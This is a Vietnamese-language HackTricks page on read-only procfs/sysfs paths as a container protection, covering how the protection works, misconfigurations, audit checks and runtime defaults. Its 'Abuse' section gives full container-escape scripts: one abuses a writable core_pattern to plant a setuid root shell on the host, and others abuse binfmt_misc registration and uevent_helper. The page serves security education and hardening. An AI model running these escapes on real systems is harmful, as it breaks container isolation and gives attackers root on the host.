# Các đường dẫn hệ thống chỉ đọc

{{#include ../../../../banners/hacktricks-training.md}}

Các đường dẫn hệ thống chỉ đọc là một lớp bảo vệ riêng biệt với các đường dẫn bị che. Thay vì ẩn hoàn toàn một đường dẫn, runtime vẫn hiển thị đường dẫn đó nhưng gắn kết nó ở chế độ chỉ đọc. Cách này thường được áp dụng cho một số vị trí procfs và sysfs, nơi quyền đọc có thể được chấp nhận hoặc cần thiết cho hoạt động, nhưng quyền ghi sẽ quá nguy hiểm.

Mục đích rất đơn giản: nhiều giao diện kernel trở nên nguy hiểm hơn nhiều khi có thể ghi. Gắn kết chỉ đọc không loại bỏ mọi giá trị do thám, nhưng ngăn workload bị xâm phạm sửa đổi các tệp hướng đến kernel thông qua đường dẫn đó.

## Hoạt động

Runtime thường đánh dấu một số phần trong chế độ xem proc/sys là chỉ đọc. Tùy runtime và host, các đường dẫn này có thể bao gồm:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Danh sách thực tế có thể khác nhau, nhưng mô hình vẫn giống nhau: cho phép hiển thị khi cần, mặc định từ chối mọi thay đổi.<sup>[[1]](#references)</sup>

## Lab

Kiểm tra danh sách đường dẫn chỉ đọc do Docker khai báo:

```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```

Kiểm tra proc/sys được mount từ bên trong container:

```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```

## Tác động bảo mật

Các đường dẫn hệ thống chỉ đọc hạn chế một nhóm lớn hành vi lạm dụng có thể ảnh hưởng đến host. Ngay cả khi kẻ tấn công có thể kiểm tra procfs hoặc sysfs, việc không thể ghi vào đó sẽ loại bỏ nhiều cách sửa đổi trực tiếp liên quan đến các kernel tunable, crash handler, helper nạp module hoặc giao diện điều khiển khác. Mức độ phơi lộ không biến mất, nhưng việc chuyển từ tiết lộ thông tin sang tác động lên host trở nên khó khăn hơn.

## Cấu hình sai

Những sai lầm chính là bỏ che chắn hoặc remount các đường dẫn nhạy cảm ở chế độ read-write, trực tiếp để lộ nội dung proc/sys của host thông qua bind mount có quyền ghi, hoặc dùng các chế độ privileged về cơ bản vô hiệu hóa các mặc định an toàn hơn của runtime. Trong Kubernetes, `procMount: Unmasked` và workload privileged thường đi cùng với cơ chế bảo vệ proc yếu hơn.<sup>[[2]](#references)</sup> Một sai lầm vận hành phổ biến khác là cho rằng vì runtime thường mount các đường dẫn này ở chế độ chỉ đọc nên mọi workload vẫn kế thừa mặc định đó.

## Lạm dụng

Nếu cơ chế bảo vệ yếu, hãy bắt đầu bằng cách tìm các mục proc/sys có quyền ghi:

```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```

Khi có các mục có thể ghi, những đường dẫn cần kiểm tra tiếp theo có giá trị cao bao gồm:

```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```

Những gì các lệnh này có thể tiết lộ:

- Các mục có quyền ghi bên dưới `/proc/sys` thường cho thấy container có thể thay đổi hành vi của kernel trên host, chứ không chỉ kiểm tra nó.
- `core_pattern` đặc biệt quan trọng vì một giá trị hướng tới host có quyền ghi có thể trở thành đường dẫn thực thi code trên host nếu làm tiến trình crash sau khi thiết lập pipe handler.
- `modprobe` tiết lộ helper mà kernel dùng cho các luồng liên quan đến việc tải module; đây là mục tiêu có giá trị cao kinh điển khi có quyền ghi.
- `binfmt_misc` cho biết có thể đăng ký interpreter tùy chỉnh hay không. Nếu có quyền ghi để đăng ký, nó có thể trở thành primitive thực thi thay vì chỉ gây ra information leak.
- `panic_on_oom` kiểm soát quyết định ở cấp kernel trên toàn host, do đó có thể biến tình trạng cạn kiệt tài nguyên thành sự cố từ chối dịch vụ trên host.
- `uevent_helper` là một trong những ví dụ rõ nhất về việc đường dẫn helper trong sysfs có quyền ghi dẫn đến thực thi trong ngữ cảnh host.

Các phát hiện đáng chú ý bao gồm những proc knob hoặc mục sysfs hướng tới host có quyền ghi, vốn bình thường phải ở chế độ chỉ đọc. Khi đó, workload đã chuyển từ góc nhìn container bị giới hạn sang khả năng tác động đáng kể đến kernel.

### Ví dụ đầy đủ: Thoát container sang host bằng `core_pattern`

Nếu có thể ghi vào `/proc/sys/kernel/core_pattern` từ bên trong container và đường dẫn này trỏ đến góc nhìn kernel của host, có thể lợi dụng nó để thực thi payload sau khi xảy ra crash:

```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
  char buf[1];
  for (int i = 0; i < 100; i++) buf[i] = 1;
  return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```

Nếu path thực sự chạm tới host kernel, payload sẽ chạy trên host và để lại một shell setuid.

### Ví dụ đầy đủ: Đăng ký `binfmt_misc`

Nếu có thể ghi vào `/proc/sys/fs/binfmt_misc/register`, việc đăng ký một interpreter tùy chỉnh có thể dẫn đến code execution khi thực thi file khớp:

```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```

Trên `binfmt_misc` có thể ghi và hướng ra host, kết quả là code execution trong đường dẫn interpreter do kernel kích hoạt.

### Ví dụ đầy đủ: `uevent_helper`

Nếu có thể ghi vào `/sys/kernel/uevent_helper`, kernel có thể gọi một helper nằm trên host khi một sự kiện khớp được kích hoạt:

```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```

Lý do điều này nguy hiểm đến vậy là vì đường dẫn helper được phân giải theo góc nhìn của hệ thống tệp trên host, thay vì trong ngữ cảnh an toàn chỉ dành cho container.

## Checks

Các kiểm tra này xác định liệu procfs/sysfs có được hiển thị ở chế độ chỉ đọc như mong đợi hay không, đồng thời liệu workload vẫn có thể sửa đổi các giao diện kernel nhạy cảm hay không.

```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```

Điều đáng chú ý ở đây:

- Một workload được harden thông thường chỉ nên để lộ rất ít mục proc/sys có thể ghi.
- Các đường dẫn `/proc/sys` có thể ghi thường quan trọng hơn quyền đọc thông thường.
- Nếu runtime cho biết một đường dẫn là chỉ đọc nhưng thực tế lại có thể ghi, hãy kiểm tra kỹ mount propagation, bind mount và thiết lập quyền đặc biệt.

## Mặc định của runtime

| Runtime / platform | Trạng thái mặc định | Hành vi mặc định | Cách nới lỏng phổ biến bằng cấu hình thủ công |
| --- | --- | --- | --- |
| Docker Engine | Được bật theo mặc định | Docker xác định danh sách đường dẫn chỉ đọc mặc định cho các mục proc nhạy cảm | để lộ các mount proc/sys của host, `--privileged` |
| Podman | Được bật theo mặc định | Podman áp dụng các đường dẫn chỉ đọc mặc định trừ khi được nới lỏng rõ ràng | `--security-opt unmask=ALL`, mount rộng từ host, `--privileged` |
| Kubernetes | Kế thừa mặc định của runtime | Sử dụng mô hình đường dẫn chỉ đọc của runtime bên dưới, trừ khi bị nới lỏng qua thiết lập Pod hoặc mount từ host | `procMount: Unmasked`, workload có đặc quyền, mount proc/sys có thể ghi từ host |
| containerd / CRI-O under Kubernetes | Mặc định của runtime | Thường dựa vào mặc định của OCI/runtime | giống hàng Kubernetes; các thay đổi cấu hình runtime trực tiếp có thể làm suy yếu hành vi này |

Điểm mấu chốt là các đường dẫn hệ thống chỉ đọc thường được runtime thiết lập mặc định, nhưng rất dễ bị vô hiệu hóa bằng chế độ có đặc quyền hoặc bind mount từ host.

## References

- [1] [Đặc tả OCI Runtime: Cấu hình Linux Container (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Tham chiếu API Kubernetes: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)
{{#include ../../../../banners/hacktricks-training.md}}
